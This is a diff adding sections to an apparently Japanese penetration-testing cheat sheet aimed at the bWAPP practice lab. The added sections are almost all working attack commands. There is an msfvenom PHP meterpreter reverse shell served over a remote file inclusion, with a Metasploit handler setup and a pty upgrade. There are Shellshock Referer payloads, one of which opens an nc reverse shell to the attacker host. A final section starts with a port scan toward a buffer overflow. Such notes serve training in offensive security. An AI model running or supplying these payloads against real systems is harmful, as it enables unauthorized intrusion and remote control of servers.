@@ -628,3 +628,42 @@ stty raw -echo
 fg
 reset
 ```
+
+### RFI/LFI
+
+```bash
+# PHP用のリバースシェルを作成
+sudo msfvenom -p php/meterpreter_reverse_tcp LHOST=10.0.0.1 LPORT=4446 -f raw -o /var/www/html/evil.txt
+
+sudo service apache2 restart
+# http://[host IP]:8050/evil.txt でアクセスできるようになる
+
+msfconsole
+use exploit/multi/handler
+set LPORT 4446
+set LHOST [host IP]
+set PAYLOAD php/meterpreter_reverse_tcp
+run
+
+# http://[target IP]/bWAPP/rlfi.php?language=http://[host IP]:8050/evil.txt にアクセス
+
+shell
+# プロンプトを表示
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+### Shellshock
+
+```bash
+# BurpのRepeaterでShellshock脆弱性があるか検証
+Referer: () { bWAPP; }; echo; /bin/echo "shell shock"
+# Shellshock脆弱性によりリバースシェルセッションを確立
+Referer: () { bWAPP; }; echo; /bin/nc -e /bin/bash [host IP] 5050
+```
+
+### リモートバッファオーバーフロー
+
+```bash
+# ポートスキャン
+nmap -p1-1024 [target IP] -T5
+```
